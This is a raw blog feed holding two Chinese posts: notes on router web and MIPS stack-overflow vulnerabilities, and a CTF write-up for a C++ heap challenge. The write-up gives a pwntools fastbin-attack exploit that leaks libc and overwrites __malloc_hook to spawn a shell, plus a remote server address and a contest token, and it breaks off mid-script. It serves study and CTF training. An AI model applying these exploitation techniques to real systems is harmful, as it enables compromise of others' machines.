        <content type="html"><![CDATA[<p>前言，基本也是《0day路由器漏洞挖掘》这本书的读书笔记</p><h1 id="路由器web漏洞"><a href="#路由器web漏洞" class="headerlink" title="路由器web漏洞"></a>路由器web漏洞</h1><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>针对路由器的web管理页面，例如：攻击者发现路由器管理页面包含一个反射型XSS，就可以构建一个利用这个XSS漏洞的URL，并且将其通过邮件或QQ发送给受害者，引诱受害者点击这个URL，从而访问路由器网页。受害者点击URL，恶意代码就会在浏览器中执行，它可以将路由器网页会话Cookie发送给攻击者攻击者在受害者不知情的情况下通过Cookie盗取更敏感的消息。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/0.png"></div>## CSRF漏洞攻击者针对一个针对路由器CSRF链接，欺骗受害者点击该链接，其功能是修改路由器DNS为一个伪造的DNS服务器。之后受害者访问正常网页时，因为DNS劫持而将所有网络访问数据发送给攻击者。攻击者监控受害者所有行为，受害者却毫不知情。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/1.png"></div>## 基础认证漏洞<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/2.png"></div><h1 id="路由器后门漏洞"><a href="#路由器后门漏洞" class="headerlink" title="路由器后门漏洞"></a>路由器后门漏洞</h1><p>为了调试方便、信息获取方便或者是人为故意等情况留下的后门，该后门可以令几乎所有的保护措施全部失效。</p><h1 id="路由器溢出漏洞"><a href="#路由器溢出漏洞" class="headerlink" title="路由器溢出漏洞"></a>路由器溢出漏洞</h1><h2 id="MIPS32架构堆栈"><a href="#MIPS32架构堆栈" class="headerlink" title="MIPS32架构堆栈"></a>MIPS32架构堆栈</h2><p>栈操作：MIPS32没有EBP，进入一个函数时需要将当前栈指针向下移动n个比特，这个大小为n比特的存储空间就是Stack Frame的存储区域，寄存器压栈和出栈都必须指定偏移量。</p><h2 id="函数调用栈布局"><a href="#函数调用栈布局" class="headerlink" title="函数调用栈布局"></a>函数调用栈布局</h2><p>叶子函数和非叶子函数，一个函数不在调用其它任何函数，那么当前的函数就是一个叶子函数，否则就是非叶子函数。</p><h3 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/3.png"></div><h3 id="函数调用参数传递"><a href="#函数调用参数传递" class="headerlink" title="函数调用参数传递"></a>函数调用参数传递</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/4.png"></div><p>例：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/5.png"></div><p>main函数会将more_arg()函数的前四个参数传到a0~a3中，第五个参数保留在main函数栈顶预留的空间。但是看到main函数还是为前四个参数预留了空间：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/6.png"></div>在执行more_arg()函数前，将5个参数分别保存到堆栈中。more_arg()分配栈空间后，more_arg()函数将a0~a4复制到main()函数栈帧预留的调用参数空间中。当指令执行到sprintf函数时，sprintf函数的调用需要七个参数，通过需要借助堆栈进行参数传递。此时more_arg()函数将4个参数存入a0~a3，剩余三个保存到more_arg()函数自己的调用参数空间中。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/7.png"></div><h2 id="缓冲区溢出利用的可行性"><a href="#缓冲区溢出利用的可行性" class="headerlink" title="缓冲区溢出利用的可行性"></a>缓冲区溢出利用的可行性</h2><h3 id="非叶子函数"><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h3><p>has_stack函数调用了strcpy函数，因此，has_stack是非叶子函数，返回main()函数的地址会首先保存到寄存器$ra中，进入has_stack()函数以后，has_stack会把返回main()函数的返回地址保存在has_stack的堆栈中，在has_stack()函数返回main()函数继续执行时，将保存在堆栈中的返回main()函数的返回地址写入$ra并返回main()函数继续执行。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">has_stack</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> dst<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">has_stack</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇编代码：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/8.png"></div>调试看到has_stack中有个lw $ra 0x34($sp)的指令，后面有jr $ra指令。也就是将main函数地址写道ra，然后再跳转过去。那么如果has_stack出现栈溢出漏洞，控制sp+0x34内存的内容，那么就可以跳转任意地址了。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/9.png"></div><h3 id="叶子函数"><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h3><p>源码</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">no_stack</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">,</span><span class="token keyword">int</span> count<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> dst<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>count<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dst<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">no_stack</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/lu-you-qi-chang-jian-lou-dong-zong-jie/10.png"></div>发现子函数no_stack中没有对ra进行操作，由于返回main函数的地址不是存储在stack中，而是直接存在寄存器中的，但并不意味着叶子函数无法覆盖返回地址，如果溢出长度足够大同样可能修改main函数(父函数)的栈帧，从而覆盖掉上层函数的返回地址。<p><strong>综上所述：非页函数可以通过溢出覆盖掉上层函数的返回地址，叶函数无法直接覆盖上层函数的返回地址，但可以覆盖掉上层函数的栈帧，从而覆盖掉上层函数的上层函数的返回地址。</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 从0学习路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ PWN初探（一）</title>
      <link href="/2020/09/07/c-pwn-chu-tan-yi/"/>
      <url>/2020/09/07/c-pwn-chu-tan-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="EasyCpp"><a href="#EasyCpp" class="headerlink" title="EasyCpp"></a>EasyCpp</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/c-pwn-chu-tan-yi/0.png"></div>首先看到不能hijacking GOT。<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>查看源码得知这是一个C++程序。由于之前没做过，有很多机制并没有很清楚。</p><p>问题一：在edit中析构函数会free(栈上的一个地址)，而这个地址是可以更改的。我们可以伪造chunk，并且释放掉。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/c-pwn-chu-tan-yi/1.png"></div>问题二：在edit中会创建一个0x20的chunk（这个条件基本也用不上）问题三：我们在写入编号的时候可以创建根据输入大小的chunk<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/c-pwn-chu-tan-yi/2.png"></div><h2 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h2><p>一.泄露libc地址<br>1.将password在内的chunk释放到bin中（大小需要0x70,因为包含T在内的位置0x603295处chunk)<br>2.在第二次选择2编辑password的fd为0x603295(包含T在内的size合法的chunk)，经过两次edit输入T某个password地址，password地址上是got值<br>3.在进行edit打印出泄露libc地址<br>二.任意地址分配，hijaking  malloc_hook函数写入one_gadget（由于在edit里面直接会先malloc一个对象size的chunk）<br>1.释放password进入chunk<br>2.修改password<br>3.两次分配进入libc</p><h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><p>内存图基本如下：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/c-pwn-chu-tan-yi/3.png"></div><p>一.泄露libc地址<br>第一步：将password在内的chunk释放到bin中（大小需要0x70,因为包含T在内的位置0x603295处chunk)</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># make a fake chunk in 0x70 bin</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6032f0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 先释放password上的伪造chunk</span>edit<span class="token punctuation">(</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 随便写的</span><span class="token comment" spellcheck="true"># # modify  position fake chunk's fd pointer T position chunk</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x603285</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 修改password chunk的fd指向T在内的chunk位置</span>edit<span class="token punctuation">(</span><span class="token string">"\x77"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这个字节数要保证把第一个fastbin（0x70）的先分配掉，下一个才是T在内的目标chunk</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二步：在第二次选择2编辑password的fd为0x603295(包含T在内的size合法的chunk)，经过两次edit输入T某个password地址，password地址上是got值</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># # modify password content is got to leak libc_offset</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x603285</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 在password中精心构造数据，使T指向password上地址A，A是GOT，那么show出来就是真实地址了</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">*</span><span class="token string">"c"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x603370</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这里是写入T中数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第三步：在进行edit打印出泄露libc地址</p><pre class="line-numbers language-python"><code class="language-python">choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6032f0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 这里是为了保证数据不混乱，这里调试了好久，由于 愚蠢的错误，输入0xa0的数据导致后面的输入不能正常进行</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"STUDENT: "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_offset<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span>target_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_offset<span class="token number">-0x23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>二.任意地址分配，hijaking  malloc_hook函数写入one_gadget（由于在edit里面直接会先malloc一个对象size的chunk）<br>1.释放password进入chunk</p><pre class="line-numbers language-python"><code class="language-python">choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#老计重施，fastbin  attack</span>edit<span class="token punctuation">(</span><span class="token string">"\x77"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.修改password中fd为malloc_hook相近地址</p><pre class="line-numbers language-python"><code class="language-python">choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> one_gadgets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_offset<span class="token comment" spellcheck="true"># edit(11*"\x00"+p64(one_gadget)+p64(libc.symbols['realloc']+libc_offset+13)+(0x60-7-0x13)*"\x00")</span>edit<span class="token punctuation">(</span><span class="token number">19</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.getshell</p><pre class="line-numbers language-python"><code class="language-python">choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x8f</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timecontext<span class="token punctuation">.</span>log_level  <span class="token operator">=</span>  <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># p = process("./EasyCPP")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.93.241"</span><span class="token punctuation">,</span><span class="token number">10012</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./EasyCPP"</span><span class="token punctuation">)</span>token <span class="token operator">=</span> <span class="token string">"607:MEYCIQDdqBeqYMwR1zMlVJdhW4iKnhy6RGzLItpuTdQaTZ4kawIhAJWhD+5VH5mgcveeQBqaIil/XsURguYUD+n/aHO8/6gZ"</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your token: "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>token<span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> <span class="token string">"admin"</span>    password <span class="token operator">=</span> <span class="token string">"p455w0rd"</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Username:"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Password:"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Tell me the new STUDENT NUMBER(eg: PB19000001), please:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>id<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Now tell me his/her CALCULUS grade(0~100):\n"</span><span class="token punctuation">,</span><span class="token string">"80"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Then the LINEAR ALGEBRA grade:\n"</span><span class="token punctuation">,</span><span class="token string">"80"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"grade:\n"</span><span class="token punctuation">,</span><span class="token string">"80"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"grade:\n"</span><span class="token punctuation">,</span><span class="token string">"80"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">editPassword</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"password: \n"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># time.sleep(2)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># make a fake chunk in 0x70 bin</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6032f0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># # modify  position fake chunk's fd pointer T position chunk</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x603285</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">"\x77"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># # modify password content is got to leak libc</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token 